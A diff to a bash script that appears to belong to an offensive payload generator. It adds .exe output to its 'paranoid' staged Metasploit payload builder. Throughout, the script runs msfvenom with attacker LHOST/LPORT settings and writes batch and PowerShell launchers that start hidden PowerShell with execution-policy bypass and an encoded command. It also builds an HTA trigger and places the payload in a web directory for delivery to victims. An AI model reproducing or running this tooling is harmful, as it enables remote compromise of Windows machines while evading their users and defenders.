@@ -304,20 +304,6 @@ BuIlD=$(zenity --list --title "☠ PAYLOAD CATEGORIES ☠" --text "\nChose paylo
 if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   echo ${BlueF}[☠]${white} staged payload sellected ..${Reset};
   sleep 1
-  #
-  # Check for NON-compatible extension (staged payloads) ..
-  #
-  if [ "$DEFAULT_EXT" = "bat" ] || [ "$DEFAULT_EXT" = "ps1" ] || [ "$DEFAULT_EXT" = "txt" ]; then
-  echo "compatible extension" > /dev/null 2>&1
-  else
-    # NOT compatible payload extension found ..
-    echo ${RedF}[x] Aborting script execution ..${Reset};
-    echo ${RedF}[x]${white} Extension:${RedF}$DEFAULT_EXT ${white}'(Not compatible)' with ${RedF}Staged${white} payloads ..${Reset};
-    echo ${RedF}[x]${white} Edit settings File and chose bat or ps1 or txt extensions ..${Reset};
-    sleep 1
-    exit
-  fi
-
     #
     # Create a Paranoid Payload (staged payload)
     # For this use case, we will combine Payload UUID tracking with TLS pinning.
@@ -332,17 +318,27 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
      else
        ArCh="x86"
      fi
-    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f psh-cmd -o paranoid-staged.$DEFAULT_EXT
+     # config correct format ..
+     if [ "$DEFAULT_EXT" = "exe" ]; then
+       format="exe"
+     else
+       format="psh-cmd"
+     fi
+    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -a $ArCh -f $format -o paranoid-staged.$DEFAULT_EXT
 
       #
       # head (shellcode) - paranoid-staged.bat
       #
-      str0=`cat $IPATH/output/paranoid-staged.$DEFAULT_EXT | awk {'print $12'}`
-      rm $IPATH/output/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
+      if [ "$DEFAULT_EXT" = "exe" ]; then
+        echo "No template required" > /dev/null 2>&1
+      else
+        str0=`cat $IPATH/output/paranoid-staged.$DEFAULT_EXT | awk {'print $12'}`
+        rm $IPATH/output/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
+      fi
       echo ${BlueF}[☠]${white} Building template ..${Reset};
       sleep 2
         #
-        # build template file ( bat )
+        # build template file ( bat | ps1 | txt)
         #
         if [ "$DEFAULT_EXT" = "bat" ]; then
           echo ":: template batch | Author: r00t-3xp10it" > $IPATH/output/template
@@ -352,6 +348,9 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
           echo "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -Exec Bypass -noni -enc $str0" >> $IPATH/output/template
           echo "exit" >> $IPATH/output/template
           mv -f template paranoid-staged.$DEFAULT_EXT
+          # no template required ..
+        elif [ "$DEFAULT_EXT" = "exe" ]; then
+          echo "No template required" > /dev/null 2>&1
         else
           # build template ( ps1 | txt )
           echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $str0" > $IPATH/output/template
@@ -368,14 +367,14 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
         #
         # Building HTA trigger file ..
         #
-        if [ "$DEFAULT_EXT" = "bat" ]; then
+        if [ "$DEFAULT_EXT" = "bat" ] || [ "$DEFAULT_EXT" = "exe" ]; then
           # barra bug-fix bat execution using hta ..
           echo ${BlueF}[☠]${white} "Building hta trigger file" ..${Reset};
           sleep 2
           sed "s|LhOsT|$LhOsT|" EasyFileSharing2.hta > trigger.hta
-          sed -i "s|NaMe|paranoid-staged.bat|g" trigger.hta
+          sed -i "s|NaMe|paranoid-staged.$DEFAULT_EXT|g" trigger.hta
           mv trigger.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
-          cp $IPATH/output/paranoid-staged.exe $ApAcHe/paranoid-staged.exe > /dev/null 2>&1
+          cp $IPATH/output/paranoid-staged.$DEFAULT_EXT $ApAcHe/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
         else
           echo ${BlueF}[☠]${white} "Building hta trigger file" ..${Reset};
           sleep 2
